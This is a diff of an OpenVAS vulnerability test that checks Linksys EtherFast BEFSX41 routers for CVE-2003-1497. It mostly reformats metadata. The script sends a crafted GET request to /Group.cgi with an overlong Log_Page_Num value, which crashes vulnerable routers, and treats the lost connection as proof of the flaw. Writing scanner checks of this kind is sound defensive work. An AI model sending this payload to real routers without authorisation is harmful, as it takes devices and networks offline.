@@ -1,6 +1,8 @@
+###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: linksys_dos.nasl 9348 2018-04-06 07:01:19Z cfischer $
-# Description: LinkSys EtherFast Router Denial of Service Attack
+# $Id: linksys_dos.nasl 10322 2018-06-26 06:37:28Z cfischer $
+#
+# LinkSys EtherFast Router Denial of Service Attack
 #
 # Authors:
 # Matt North
@@ -20,19 +22,7 @@
 # You should have received a copy of the GNU General Public License
 # along with this program; if not, write to the Free Software
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
-#
-
-tag_summary = "The remote host seems to be a Linksys EtherFast Cable Firewall/Router.
-
-This product is vulnerable to a remote Denial of service attack : if logging 
-is enabled, an attacker can specify a long URL which results in the router 
-becoming unresponsive.";
-
-tag_solution = "Update firmware to version 1.45.3
-          http://www.linksys.com/download/firmware.asp?fwid=172.
-
-Risk: High";
-
+###############################################################################
 
 # Linksys EtherFast Cable/DSL Firewall Router
 # BEFSX41 (Firmware 1.44.3) DoS
@@ -40,52 +30,48 @@ Risk: High";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.11891");
-  script_version("$Revision: 9348 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
+  script_version("$Revision: 10322 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-06-26 08:37:28 +0200 (Tue, 26 Jun 2018) $");
   script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
   script_tag(name:"cvss_base", value:"6.3");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:N/I:N/A:C");
- script_cve_id("CVE-2003-1497");
- script_bugtraq_id(8834);
-
-  name = "LinkSys EtherFast Router Denial of Service Attack";
-  script_name(name);
-
-
-
-  summary = "URL results in DoS of Linksys router";
+  script_cve_id("CVE-2003-1497");
+  script_bugtraq_id(8834);
+  script_name("LinkSys EtherFast Router Denial of Service Attack");
   script_category(ACT_DENIAL);
-  script_tag(name:"qod_type", value:"remote_vul");
   script_copyright("This script is Copyright (C) 2003 Matt North");
-
-  family = "Denial of Service";
-   script_family(family);
+  script_family("Denial of Service");
   script_dependencies("gb_get_http_banner.nasl");
   script_mandatory_keys("linksys/banner");
-  script_require_ports("Services/www", 80);
-  script_tag(name : "solution" , value : tag_solution);
-  script_tag(name : "summary" , value : tag_summary);
-  script_xref(name : "URL" , value : "http://www.digitalpranksters.com/advisories/linksys/LinksysBEFSX41DoSa.html");
+
+  script_xref(name:"URL", value:"http://www.digitalpranksters.com/advisories/linksys/LinksysBEFSX41DoSa.html");
+
+  script_tag(name:"solution", value:"Update firmware to version 1.45.3
+
+  http://www.linksys.com/download/firmware.asp?fwid=172.");
+
+  script_tag(name:"summary", value:"The remote host seems to be a Linksys EtherFast Cable Firewall/Router.
+
+  This product is vulnerable to a remote Denial of service attack : if logging
+  is enabled, an attacker can specify a long URL which results in the router
+  becoming unresponsive.");
+
+  script_tag(name:"qod_type", value:"remote_vul");
+  script_tag(name:"solution_type", value:"VendorFix");
+
   exit(0);
 }
 
 include("http_func.inc");
 
-
 port = get_http_port(default:80);
-
-if(http_is_dead(port:port))exit(0);
+if(http_is_dead(port:port)) exit(0);
 
 banner = get_http_banner(port:port);
-if(!banner)exit(0);
-if("linksys" >!< banner)exit(0);
-
-soc = open_sock_tcp(port);
-if(!soc) exit(0);
-
+if(! banner || "linksys" >!< banner) exit(0);
 
 req = http_get(port: port, item: "/Group.cgi?Log_Page_Num=1111111111&LogClear=0");
-send(socket: soc , data: req);
-close(soc);
+http_send_recv(port: port, data: req);
+
 alive = open_sock_tcp(port);
-if (!alive) security_message(port);
+if (!alive) security_message(port:port);
